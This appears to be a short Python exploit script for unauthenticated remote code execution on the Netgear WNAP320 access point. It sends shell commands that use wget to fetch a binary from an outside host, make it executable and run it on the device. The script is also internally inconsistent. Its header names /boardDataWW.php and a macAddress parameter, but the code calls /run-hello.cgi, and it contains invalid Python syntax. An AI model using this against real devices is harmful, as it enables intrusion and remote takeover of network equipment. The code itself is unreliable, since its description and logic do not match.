# Exploit Title: Netgear WNAP320 2.0.3 - 'macAddress' Remote Code Execution (RCE) (Unauthenticated)
# Vulnerability: Remote Command Execution on /boardDataWW.php macAddress parameter
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# IoT Device: Netgear WNAP320 Access Point
# Version: WNAP320 Access Point Firmware v2.0.3

import requests
import sys

if(len(sys.argv) != 3):
	print('Must specify the IP and device type(arm->1, mips->2) parameters')
	print("eg: python3 script.py <IP> <device type>")
	sys.exit(0)

host = sys.argv[1]
deviceT = sys.argv[2]
port = 80

#cmd = 'wget http://192.168.0.99:8080/mips; chmod +x mips; ./mips; rm -rf mips;'

if(deviceT = 1):
	data = {
		'cmd':'wget -P /tmp http://10.0.2.15:8000/arm; chmod +x /tmp/arm; qemu-arm-static /tmp/arm'
	}

else if (deviceT=2):
	data = {
		'cmd':'wget -P /tmp http://10.0.2.15:8000/mips; chmod +x /tmp/mips; qemu-mips-static /tmp/mips'
	}
else:
	print('Device Type must be 1(arm) or 2(mips)')
	sys.exit(0)

url = 'http://' + host + '/run-hello.cgi'
response = requests.get(url, params=data)
